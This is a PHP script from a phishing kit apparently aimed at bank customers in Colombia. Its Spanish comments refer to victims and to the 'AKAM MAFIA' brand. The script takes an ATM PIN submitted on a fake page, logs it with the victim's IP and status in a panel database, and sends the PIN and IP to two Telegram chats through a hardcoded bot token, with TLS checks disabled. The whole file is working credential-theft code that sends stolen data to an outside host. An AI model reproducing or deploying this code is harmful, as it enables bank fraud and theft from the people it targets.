<?php
// Asegúrate de que NO haya espacios ni líneas vacías antes del <?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$pin = isset($_POST['pass']) ? $_POST['pass'] : ''; 

if (!empty($pin)) {
    // 1. Guardar en base de datos (Si falla, el código sigue)
    if (function_exists('actualizar_registro')) {
        actualizar_registro($ip, "PIN", $pin); 
    }
    
    // Cambiar estado a 4 (Si la función no existe, no romperá el envío)
    if (function_exists('actualizar_estado_victima')) {
        actualizar_estado_victima($ip, "4"); 
    }

    // 2. Configuración del Bot de 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = ["8114050673", "8518977918"]; 

    // 3. Formato del mensaje
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - NUEVO PIN</b> ⭐\n\n";
    $mensaje .= "👤 <b>IP:</b> <code>" . $ip . "</code>\n";
    $mensaje .= "🔑 <b>PIN DE CAJERO:</b> <code>" . $pin . "</code>\n";
    $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    // 4. Envío mediante CURL
    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
        $params = [
            'chat_id' => $id,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        $result = curl_exec($ch);
        curl_close($ch);
    }
}
?>
